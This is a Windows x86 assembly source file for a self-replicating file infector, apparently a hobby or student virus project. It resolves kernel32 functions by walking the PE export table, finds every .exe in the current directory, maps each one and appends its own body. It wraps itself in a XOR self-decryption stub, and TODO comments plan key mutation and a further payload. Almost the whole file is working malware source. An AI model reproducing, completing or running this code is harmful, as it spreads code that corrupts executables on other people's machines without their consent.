; msgbox.asm

.386
.model flat, stdcall
option casemap:none

      include windows.inc
      ;include user32.inc
	  include kernel32.inc

	  ;include handle_file.inc


      includelib user32.lib
      includelib kernel32.lib

.data


.code

APPLYXORVALUE	macro addrbegin, addrend, value

	push esi
	push ecx	
	push eax

	mov esi, addrbegin
	mov ecx, addrend - addrbegin
	xor eax, eax

	.WHILE ecx > 0
		
		mov ah, byte ptr [esi]
		xor eax, value
		mov byte ptr [esi], ah

		inc esi
		dec ecx
	.ENDW

	pop eax
	pop esi
	pop ecx
				endm




main:
	mov ebx, [esp]
	jmp crypted_code_end

crypted_code_begin:
loadproc	macro dest, hmodule, loadproc, strproc
	push eax
	push strproc
	push hmodule
	call loadproc
	mov dest, eax
	pop eax
			endm

movloc	macro	dest, src

	push edi
	mov edi, src
	mov dest, edi
	pop edi

		endm

addloc macro	dest, src

	push edi
	mov edi, dest
	add edi, src
	mov dest, edi
	pop edi

	   endm

extractKernel32PEHeader proc delta:dword

	and delta, 0FFFF0000h
l1:
	sub delta, 1000h
	mov ecx, [delta]
	cmp word ptr [ecx], "ZM"
	jne l1

	mov eax, [ecx + 3Ch]
	cmp word ptr [eax + ecx], "EP"
	je return
	xor eax, eax
	ret

return:
	add eax, ecx
	ret
extractKernel32PEHeader endp


getPEBaseAddr proc PEAddr:dword
	
	mov ebx, PEAddr
	add ebx, 18h ;; offset to IMAGE_OPTIONAL_HEADER
	assume ebx:ptr IMAGE_OPTIONAL_HEADER
	mov eax, [ebx].ImageBase
	assume ebx:nothing
	ret
getPEBaseAddr endp

getExportedProcAddr proc PEHeader:dword, PEBaseAddr:dword, ProcName:dword, ProcNameSize:dword
	local exportSectionVAddr:dword
	local numberOfFunctions:dword
	local exportDirectoryAddr:dword
	local funcIndex:dword
	local ordinalsAddr:dword
	local funcsAddr:dword

	mov ebx, PEHeader
	add ebx, 18h				;; Optional header
	add ebx, 60h				;; IMAGE_DATA_DIRECTORY[0]
	

	assume ebx:ptr IMAGE_DATA_DIRECTORY
	movloc exportSectionVAddr, [ebx].VirtualAddress
	assume ebx:nothing
	mov exportDirectoryAddr, ebx
	xor ebx, ebx

	mov eax, exportDirectoryAddr
	mov eax, [eax]				;; IMAGE_EXPORT_DIRECTORY relative virtual address
	add eax, PEBaseAddr			;; IMAGE_EXPORT_DIRECTORY true address

	mov funcIndex, 0
	assume eax:ptr IMAGE_EXPORT_DIRECTORY
	movloc numberOfFunctions, [eax].NumberOfNames
	movloc ordinalsAddr, [eax].AddressOfNameOrdinals	;; relative address
	movloc funcsAddr, [eax].AddressOfFunctions			;; relative address
	addloc funcsAddr, PEBaseAddr						;; true address
	mov ebx, [eax].AddressOfNames
	add ebx, PEBaseAddr				;; pointer to first name
	mov edx, numberOfFunctions
	addloc ordinalsAddr, PEBaseAddr						;; true address
	.WHILE funcIndex < edx
		.IF funcIndex == 0244h
			push 0
			add esp,4
		.ENDIF
		
		mov esi, [ebx]
		add esi, PEBaseAddr
		mov edi, ProcName
		mov ecx, ProcNameSize
		cld
		repe cmpsb
		je endfindproc

		inc funcIndex
		add ebx, sizeof dword		;; go to next pointer to name
	.ENDW
	jmp endfindprocfail

endfindproc:

	assume eax:nothing
	mov		edx,			funcIndex		;; edx iterations

	shl		edx,			1				;; ordinals are on 2 bytes, so in term of memory : iterations * 2
	add		edx,			ordinalsAddr	;; directly reach correct ordinal
	xor		eax,			eax
	mov		ax,	word ptr	[edx]			;; store func ordinal in ax
	shl		eax,			2				;; ordinal is an index for a 4 bytes value, so a direct memory offset is at : ordinal * 4
	add		eax,			funcsAddr		;; direct access to function's RVA
	mov		ebx,			[eax]			;; store function's RVA
	add		ebx,			PEBaseAddr		;; function's real address
	mov		eax,			ebx


endfindprocfail:
	ret
getExportedProcAddr endp

filesLoop proc k32hmodule:HMODULE, prcGetProcAddr:dword, sectionSize:dword
	local findFileData:WIN32_FIND_DATA
	local searchHandle:dword
	local fileHandle:dword
	local fileMapping:dword
	local fileView:dword
	
	local prcFindFirstFile:dword
	local prcFindNextFile:dword
	local prcFindClose:dword
	local prcCreateFile:dword
	local prcCreateFileMapping:dword
	local prcMapViewOfFile:dword
	local prcUnmapViewOfFile:dword
	local prcCloseHandle:dword

	jmp filesLoopInit

	PatternStr				db "*.exe",0 ; As a side note, Jambi is started in our /trunk/jambi/ so add an exe there if you want this to work
	strFindFirstFile		db "FindFirstFileA",0
	strFindNextFile			db "FindNextFileA",0
	strFindClose			db "FindClose",0
	strCreateFile			db "CreateFileA",0
	strCreateFileMapping	db "CreateFileMappingA",0
	strMapViewOfFile		db "MapViewOfFile",0
	strUnmapViewOfFile		db "UnmapViewOfFile",0
	strCloseHandle			db "CloseHandle",0

filesLoopInit:

	loadproc prcFindFirstFile, k32hmodule, prcGetProcAddr, offset strFindFirstFile
	loadproc prcFindNextFile, k32hmodule, prcGetProcAddr, offset strFindNextFile
	loadproc prcFindClose, k32hmodule, prcGetProcAddr, offset strFindClose
	loadproc prcCreateFile, k32hmodule, prcGetProcAddr, offset strCreateFile
	loadproc prcCreateFileMapping, k32hmodule, prcGetProcAddr, offset strCreateFileMapping
	loadproc prcMapViewOfFile, k32hmodule, prcGetProcAddr, offset strMapViewOfFile
	loadproc prcUnmapViewOfFile, k32hmodule, prcGetProcAddr, offset strUnmapViewOfFile
	loadproc prcCloseHandle, k32hmodule, prcGetProcAddr, offset strCloseHandle

	;invoke FindFirstFile, offset PatternStr, addr findFileData
	lea edi, findFileData
	push edi
	push offset PatternStr
	call prcFindFirstFile

	cmp eax, INVALID_HANDLE_VALUE
	je filesFinished ; we are fucked
	mov searchHandle, eax
	
fileMainLoop:
	
	;invoke prcCreateFile, addr findFileData.cFileName, GENERIC_READ or GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0
	lea edi, findFileData.cFileName
	push 0
	push 0
	push OPEN_EXISTING
	push 0
	push 0
	push GENERIC_READ or GENERIC_WRITE
	push edi
	call prcCreateFile

	cmp eax, INVALID_HANDLE_VALUE
	je fileNext
	mov fileHandle, eax

	mov edx, findFileData.nFileSizeLow
	add edx, sectionSize ; edx now had our total fileSize
	

	;invoke prcCreateFileMapping, fileHandle, 0, PAGE_READWRITE, 0, 0, 0 ; This is where we have to change the size of our program.
	push 0
	push edx
	push 0
	push PAGE_READWRITE
	push 0
	push fileHandle
	call prcCreateFileMapping

	cmp eax, 0
	je fileClose
	mov fileMapping, eax


	;invoke prcMapViewOfFile, fileMapping, FILE_MAP_ALL_ACCESS, 0, 0, 0
	push 0
	push 0
	push 0
	push FILE_MAP_ALL_ACCESS
	push fileMapping
	call prcMapViewOfFile
	cmp eax, 0
	je fileMapClose
	mov fileView, eax

	mov esi, main ;from the beginning of our code

	mov edi, fileView
	add edi, findFileData.nFileSizeLow ; to where the file originally ends

	cld
	mov ecx, sectionSize ; copy sectionSize bytes
	rep movsb ;HOLY SH1T 1TS T34L

	; fileView now points toward an array representing our file
	; TODO : change the XOR value (label: crypt_key_value)
	; XOR the content of fileview with the new value, between labels crypted_code_begin and crypted_code_end
	; treatment is done !

	push fileView
	call prcUnmapViewOfFile

fileMapClose:
	push fileMapping
	call prcCloseHandle

fileClose:
	push fileHandle
	call prcCloseHandle

fileNext:
	lea edi, findFileData
	push edi
	push searchHandle
	call prcFindNextFile

	cmp eax, 0
	jne fileMainLoop

fileNoMore:
	push searchHandle
	call prcFindClose

filesFinished:
	ret
filesLoop endp

beginInfection proc delta:dword
	local K32PEHeaderAddr:dword
	local K32BaseAddr:dword
	local procLoadLibrary:dword
	local procGetProcAddress:dword
	local procMessageBox:dword
	local localDelta:dword
	local hmodule:dword
	local fileAlignment:dword
	local sectionSize:dword

	jmp Kernel32Init

beginInfectionStr:
	LoadLibraryStr	db "LoadLibraryA",0		; localDelta + 0h
	GetProcAddrStr	db "GetProcAddress",0	; + 0Dh
	User32DllStr	db "User32.dll",0		; + 0Fh
	MessageBoxStr	db "MessageBoxA",0		; + 0Bh
	TitleStr		db "Done !",0			; + 0Ch
	Kernel32Dllstr	db "Kernel32.dll",0		; + 07h

Kernel32Init:
	mov eax, [esp]
	mov localDelta, beginInfectionStr
	invoke extractKernel32PEHeader, delta
	mov K32PEHeaderAddr, eax
	invoke getPEBaseAddr, K32PEHeaderAddr
	mov K32BaseAddr, eax



	invoke getExportedProcAddr, K32PEHeaderAddr, K32BaseAddr, localDelta, sizeof LoadLibraryStr
	mov procLoadLibrary, eax
	
	add localDelta, 0Dh
	invoke getExportedProcAddr, K32PEHeaderAddr, K32BaseAddr, localDelta, sizeof GetProcAddrStr
	mov procGetProcAddress, eax

	add localDelta, 0Fh
	push localDelta
	call procLoadLibrary
	mov hmodule, eax

	add localDelta, 0Bh
	push localDelta
	push hmodule
	call procGetProcAddress
	mov procMessageBox, eax

	add localDelta, 0Ch
	push MB_OK
	push localDelta
	push localDelta
	push 0
	call procMessageBox

	add localDelta, 07h
	push localDelta
	call procLoadLibrary

	push eax ;save eax

	mov fileAlignment, 0200h ;this should be set from the header data.
	mov eax, endfile
	sub eax, main ;we now have our total code size in eax
	mov edx, 0
	idiv fileAlignment ; divide it by fileAlignment
	inc eax
	imul eax, fileAlignment ; now our codeSize is a multiple of FileAlignement
	mov sectionSize, eax

	pop eax ;restore eax

	invoke filesLoop, eax, procGetProcAddress, sectionSize

	; TODO : this is were we add nasty stuff

	ret
beginInfection endp



startinf:

	xor eax, eax
	;invoke extractKernel32PEHeader, ebx
	invoke beginInfection, ebx
	jmp final_return

crypted_code_end:
	jmp start_uncrypt
crypt_key_value:
	CKV db 0	

start_uncrypt:
	mov eax, crypt_key_value
	mov ecx, crypted_code_begin
	APPLYXORVALUE crypted_code_begin, crypted_code_end, eax

unencrypt_loop:
	
	jmp startinf

final_return:
	ret
endfile:
end	main
